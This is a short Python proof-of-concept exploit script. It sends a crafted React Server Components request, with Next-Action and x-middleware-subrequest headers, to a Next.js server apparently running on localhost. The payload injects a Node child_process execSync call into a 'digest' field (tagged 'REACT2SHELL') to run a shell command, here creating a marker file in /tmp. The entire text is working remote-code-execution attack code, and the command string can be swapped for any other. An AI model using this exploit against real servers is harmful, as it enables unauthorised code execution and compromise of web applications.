import requests

target = "http://localhost:3001"
# Try a simpler command
command = "touch /tmp/pwned_mw"

# Full payload structure with object
payload = f'''0:{{"a":"$@1","f":"","b":"development"}}
1:E{{"digest":"${{require('child_process').execSync('{command}').toString()}}","message":"REACT2SHELL","stack":[],"environmentName":"Server"}}'''

headers = {
    "Content-Type": "text/x-component",
    "Accept": "text/x-component",
    "RSC": "1",
    "Next-Action": "603d06a328aa137d98e1471d3d006892c98c841579",
    "Next-Router-State-Tree": '["",{"children":["compiler",{"children":["__PAGE__",{}]}]}]',
    "x-middleware-subrequest": "1",
}

print(f"[*] Sending payload to {target}...")
try:
    response = requests.post(f"{target}/compiler", headers=headers, data=payload)
    print(f"Status: {response.status_code}")
    print("[+] Response:")
    print(response.text)
except Exception as e:
    print(e)
